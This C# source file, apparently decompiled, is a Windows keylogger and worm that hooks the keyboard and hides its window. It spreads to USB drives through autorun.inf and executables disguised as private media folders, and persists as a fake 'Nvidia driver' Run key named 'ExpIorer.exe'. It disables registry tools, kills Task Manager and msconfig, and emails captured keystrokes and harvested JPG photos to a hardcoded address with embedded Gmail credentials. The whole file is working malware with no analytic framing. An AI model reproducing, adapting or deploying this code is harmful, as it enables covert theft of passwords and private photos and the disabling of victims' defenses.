using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

internal class InterceptKeys
{
	private static class Program
	{
		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

		private const int WH_KEYBOARD_LL = 13;

		private const int WM_KEYDOWN = 256;

		private const int SW_HIDE = 0;

		private static LowLevelKeyboardProc _proc = HookCallback;

		private static IntPtr _hookID = IntPtr.Zero;

		private static string km;

		private static int count;

		private static List<string> li = new List<string>();

		private static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "nvidia.dll");

		private static int emailtime = DateTime.Now.Minute + 10;

		private static int usbtime = DateTime.Now.Minute + 1;

		private static int pictime = DateTime.Now.Minute + 50;

		private static bool ch = false;

		private static void USBSpread(object sender, EventArgs e)
		{
			string sourceFileName = Application.get_ExecutablePath().ToString();
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo item in drives.Where((DriveInfo x) => x.IsReady))
			{
				if (item.DriveType != DriveType.Removable)
				{
					continue;
				}
				if (File.Exists(item.Name + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe"))
				{
					break;
				}
				try
				{
					string text = item.Name + "autorun.inf";
					StreamWriter streamWriter = new StreamWriter(text);
					streamWriter.WriteLine("[autorun]\\n");
					streamWriter.WriteLine("open=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
					streamWriter.WriteLine("action=Run VMCLite");
					streamWriter.WriteLine("Shell\\Open=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
					streamWriter.WriteLine("Shell\\Open\\Default=1");
					streamWriter.WriteLine("Shell\\Explore=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
					streamWriter.WriteLine("Shell\\Explore\\Command=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
					streamWriter.WriteLine("[autorun]\n");
					streamWriter.Close();
					File.SetAttributes(item.Name + "autorun.inf", File.GetAttributes(item.Name + "autorun.inf") | FileAttributes.System);
				}
				catch
				{
				}
				string[] directories = Directory.GetDirectories(item.Name);
				foreach (string text2 in directories)
				{
					try
					{
						File.SetAttributes(text2, File.GetAttributes(text2) | FileAttributes.Hidden);
						File.SetAttributes(text2, File.GetAttributes(text2) | FileAttributes.System);
						File.Copy(sourceFileName, text2 + ".exe", overwrite: true);
					}
					catch
					{
					}
				}
				try
				{
					File.Copy(sourceFileName, item.Name + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe", overwrite: true);
				}
				finally
				{
				}
			}
		}

		private static string SearchFilesRecursive(string directory)
		{
			Stack<string> stack = new Stack<string>();
			stack.Push(directory);
			string km;
			while (stack.Count > 0)
			{
				string text = stack.Pop();
				try
				{
					string[] files = Directory.GetFiles(text, "*.JPG");
					for (int i = 0; i < files.Length; i++)
					{
						km = files[i];
						FileInfo fileInfo = new FileInfo(km);
						if (Convert.ToInt32(fileInfo.Length) > 100000 && Convert.ToInt32(fileInfo.Length) < 3000000 && !li.Exists((string mk) => mk == km))
						{
							li.Add(km);
						}
					}
				}
				catch
				{
				}
				try
				{
					string[] files = Directory.GetDirectories(text);
					foreach (string text2 in files)
					{
						if (text2 != Environment.SystemDirectory.Substring(0, 10) && text2 != Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))
						{
							stack.Push(text2);
						}
					}
				}
				catch
				{
				}
			}
			return "a";
		}

		private static void pic()
		{
			foreach (DriveInfo item in from x in DriveInfo.GetDrives()
				where x.IsReady
				select x)
			{
				SearchFilesRecursive(item.ToString());
			}
			usbtime = DateTime.Now.Minute + 1;
		}

		private static void start()
		{
			string sourceFileName = Application.get_ExecutablePath().ToString();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			folderPath = Path.Combine(folderPath, "ExpIorer.exe");
			try
			{
				File.Copy(sourceFileName, folderPath, overwrite: true);
				sourceFileName = folderPath;
			}
			catch (Exception ex)
			{
				StreamWriter streamWriter = new StreamWriter(path, append: true);
				streamWriter.WriteLine(ex.Message);
				streamWriter.Close();
			}
			try
			{
				using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\system");
				registryKey.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
			}
			catch (Exception ex)
			{
				StreamWriter streamWriter = new StreamWriter(path, append: true);
				streamWriter.Write(ex.Message);
				streamWriter.Close();
			}
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true);
				if (registryKey2.GetValue("Nvidia driver") == null)
				{
					registryKey2.SetValue("Nvidia driver", folderPath);
				}
				registryKey2.Close();
			}
			catch (Exception ex)
			{
				StreamWriter streamWriter = new StreamWriter(path, append: true);
				streamWriter.Write(ex.Message);
				streamWriter.Close();
			}
			try
			{
				RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true);
				if (registryKey2.GetValue("Nvidia driver") == null)
				{
					registryKey2.SetValue("Nvidia driver", folderPath);
				}
				registryKey2.Close();
			}
			catch (Exception ex)
			{
				StreamWriter streamWriter = new StreamWriter(path, append: true);
				streamWriter.Write(ex.Message);
				streamWriter.Close();
			}
			Console.WriteLine("Error setting startup reg key for all users.");
			try
			{
				using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced");
				registryKey.SetValue("Hidden", 0, RegistryValueKind.DWord);
			}
			catch (Exception ex)
			{
				StreamWriter streamWriter = new StreamWriter(path, append: true);
				streamWriter.Write(ex.Message);
				streamWriter.Close();
			}
			try
			{
				using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced");
				registryKey.SetValue("HideFileExt", 1, RegistryValueKind.DWord);
			}
			catch (Exception ex)
			{
				StreamWriter streamWriter = new StreamWriter(path, append: true);
				streamWriter.Write(ex.Message);
				streamWriter.Close();
			}
		}

		private static void email()
		{
			if (File.Exists(path))
			{
				if (path.Length > 70)
				{
					StreamWriter streamWriter = new StreamWriter(path);
					streamWriter.Write("");
					streamWriter.Close();
				}
				StreamReader streamReader = File.OpenText(path);
				km += streamReader.ReadToEnd();
				streamReader.Close();
			}
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "desktop.ini";
			if (!File.Exists(text))
			{
				StreamWriter streamWriter2 = File.CreateText(text);
				streamWriter2.Write("0");
				streamWriter2.Close();
			}
			StreamReader streamReader2 = File.OpenText(text);
			count = Convert.ToInt32(streamReader2.ReadToEnd());
			streamReader2.Close();
			MailMessage mailMessage = new MailMessage();
			mailMessage.To.Add("zibayekhofte_lover2006@yahoo.com");
			mailMessage.From = new MailAddress("XtahmineX@gmail.com", "XtahmineX", Encoding.UTF8);
			mailMessage.Subject = li[count].ToString() + " & " + count + " & " + li.Count;
			mailMessage.SubjectEncoding = Encoding.UTF8;
			mailMessage.Body = Environment.UserName + " *" + km;
			mailMessage.BodyEncoding = Encoding.UTF8;
			mailMessage.IsBodyHtml = false;
			mailMessage.Priority = MailPriority.High;
			SmtpClient smtpClient = new SmtpClient();
			smtpClient.Credentials = new NetworkCredential("XtahmineX@gmail.com", "morteza20");
			smtpClient.Port = 587;
			smtpClient.Host = "smtp.gmail.com";
			smtpClient.EnableSsl = true;
			if (li.Count > 0)
			{
				Attachment item = new Attachment(li[count++]);
				mailMessage.Attachments.Add(item);
			}
			ServicePointManager.ServerCertificateValidationCallback = (object s, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true;
			try
			{
				smtpClient.Send(mailMessage);
				km = "";
				StreamWriter streamWriter = new StreamWriter(path);
				streamWriter.WriteLine("");
				streamWriter.Close();
				StreamWriter streamWriter2 = File.CreateText(text);
				streamWriter2.Write(count.ToString());
				streamWriter2.Close();
			}
			catch (Exception ex)
			{
				StreamWriter streamWriter = new StreamWriter(path, append: true);
				streamWriter.WriteLine(km);
				streamWriter.WriteLine(ex.Message + "cant send");
				streamWriter.Close();
				Application.Restart();
			}
		}

		private static void Main()
		{
			if (Application.get_StartupPath().Length < 4)
			{
				Process.Start("explorer", Application.get_ExecutablePath().Substring(0, Application.get_ExecutablePath().Length - 4));
			}
			bool createdNew;
			Mutex mutex = new Mutex(initiallyOwned: true, Application.get_ProductName(), out createdNew);
			if (createdNew)
			{
				mutex.ReleaseMutex();
			}
			else
			{
				Process.GetCurrentProcess().Kill();
			}
			System.Timers.Timer timer = new System.Timers.Timer();
			timer.Elapsed += taskmgr;
			timer.AutoReset = true;
			timer.Interval = 5000.0;
			timer.Start();
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			USBSpread(null, null);
			start();
			pic();
			IntPtr consoleWindow = GetConsoleWindow();
			ShowWindow(consoleWindow, 0);
			_hookID = SetHook(_proc);
			Application.Run();
			UnhookWindowsHookEx(_hookID);
		}

		private static IntPtr SetHook(LowLevelKeyboardProc proc)
		{
			using Process process = Process.GetCurrentProcess();
			using ProcessModule processModule = process.MainModule;
			return SetWindowsHookEx(13, proc, GetModuleHandle(processModule.ModuleName), 0u);
		}

		private static void taskmgr(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("msconfig");
			Process[] processesByName2 = Process.GetProcessesByName("Taskmgr");
			try
			{
				processesByName2[0].Kill();
				processesByName[0].Kill();
			}
			catch
			{
			}
		}

		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (DateTime.Now.Minute == usbtime)
			{
				USBSpread(null, null);
				usbtime++;
			}
			if (DateTime.Now.Minute == pictime)
			{
				pic();
				pictime += 50;
			}
			if (DateTime.Now.Minute == emailtime)
			{
				email();
				emailtime += 10;
			}
			if (nCode >= 0 && wParam == (IntPtr)256)
			{
				int num = Marshal.ReadInt32(lParam);
				km += (object)(Keys)num;
			}
			return CallNextHookEx(_hookID, nCode, wParam, lParam);
		}

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
	}
}
